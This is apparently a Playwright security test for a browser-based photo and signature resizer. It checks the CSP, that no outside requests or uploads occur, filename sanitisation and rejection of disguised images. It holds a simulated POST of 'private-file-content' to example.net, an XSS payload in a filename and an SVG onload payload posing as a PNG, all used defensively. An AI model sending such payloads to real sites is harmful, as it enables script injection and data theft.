// QA-only live-site adaptation of tests/application-prep-task5-security-browser.mjs; never change production tool code.
// Task 5 — request-level privacy, metadata/canvas safety and meta CSP in a real browser.
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import {chromium,firefox,webkit} from 'playwright';
const kind=process.env.BROWSER||'chromium';
const browser=await ({chromium,firefox,webkit}[kind]).launch({headless:true});
const context=await browser.newContext({acceptDownloads:true,viewport:{width:390,height:844}});
const page=await context.newPage();
const external=[],uploads=[],errors=[];
page.on('request',request=>{
 const link=request.url();
 if(/^https?:/.test(link)&&!link.startsWith('https://alltoolforest.github.io/hub/'))external.push(link);
 if(request.method()!=='GET'&&request.method()!=='HEAD')uploads.push([request.method(),link]);
});
page.on('pageerror',error=>errors.push(error.message));
const base=process.env.LIVE_SITE_ORIGIN||'https://alltoolforest.github.io';
try{
 await page.goto(base+'/hub/documents/application-document-prep/',{waitUntil:'networkidle'});
 await page.locator('#app-workflow').waitFor();
 assert.match(await page.title(),/Application Photo.*Signature Resizer/);
 assert.equal(await page.locator('meta[name=robots]').getAttribute('content'),'noindex,nofollow');
 assert.equal(await page.locator('meta[name=referrer]').getAttribute('content'),'no-referrer');
 const csp=await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
 assert.match(csp,/default-src 'self'/);assert.match(csp,/connect-src 'self'/);
 assert.match(csp,/object-src 'none'/);
 assert.equal(await page.locator('script[src^="http"]').count(),0);

 // A page-injected inline script must not execute in CSP-protected review hosting.
 const codeBlocked=await page.evaluate(()=>{
  const s=document.createElement('script');s.textContent='window.__APPLICATION_PREP_SCRIPT_INJECTED=true;';
  document.head.append(s);
  return window.__APPLICATION_PREP_SCRIPT_INJECTED!==true;
 });
 assert.equal(codeBlocked,true,'Inline JavaScript must be blocked by page CSP');
 const remoteBlocked=await page.evaluate(async()=>{
  try{await fetch('https://example.net/privacy-leak-probe',{method:'POST',body:'private-file-content'});
   return false;
  }catch{return true;}
 });
 assert.equal(remoteBlocked,true,'Cross-origin requests must be blocked by CSP');

 const data=await page.evaluate(()=>{
  const c=document.createElement('canvas');c.width=128;c.height=80;
  const ctx=c.getContext('2d');ctx.fillStyle='white';ctx.fillRect(0,0,128,80);
  ctx.fillStyle='#000';ctx.fillRect(20,20,88,40);
  return c.toDataURL('image/png').split(',')[1];
 });
 const unsafeName='personal-<script>alert(1)</script>.png';
 await page.locator('#file-input').setInputFiles({
  name:unsafeName,mimeType:'image/png',buffer:Buffer.from(data,'base64')
 });
 await page.waitForFunction(()=>document.querySelector('.selected-files')?.textContent?.includes('Selected:'));
 assert.equal(await page.locator('#workspace script').count(),0,'File name must stay text, not HTML');
 assert.equal(await page.locator('.selected-files').textContent(),'Selected: '+unsafeName);
 await page.locator('#width').fill('140');
 await page.locator('#height').fill('80');
 await page.locator('#format').selectOption('image/png');
 await page.getByRole('button',{name:'Create image',exact:true}).click();
 await page.waitForFunction(()=>document.querySelector('.app-output-status')?.dataset.outputState==='verified');
 const dlPromise=page.waitForEvent('download');
 await page.locator('#downloads a[download]').click();
 const download=await dlPromise;
 assert.match(download.suggestedFilename(),/\.png$/);
 assert.ok(!download.suggestedFilename().includes('<'));
 const bytes=await fs.readFile(await download.path());
 assert.deepEqual([...bytes.subarray(0,8)],[137,80,78,71,13,10,26,10]);

 // Uploaded SVG/script disguised as an image must fail before browser decoding.
 await page.locator('#file-input').setInputFiles({
  name:'payload.png',mimeType:'image/png',
  buffer:Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')
 });
 await page.waitForFunction(()=>document.querySelector('.selected-files')?.textContent?.includes('Could not open'));
 assert.equal(await page.locator('#downloads a[download]').count(),1,
  'Invalid replacement preserves previously verified local output');
 assert.deepEqual(uploads,[],'The tool must not transmit files or post data');
 assert.deepEqual(external,[],'The tool must not make outside-origin requests');
 assert.deepEqual(errors,[],'Unexpected page script failures');
 console.log('TASK5_SECURITY_BROWSER_PASS '+kind+
  ': restrictive CSP, no remote requests, no upload, filename safety, malformed-image rejection, local export');
}finally{await browser.close();}
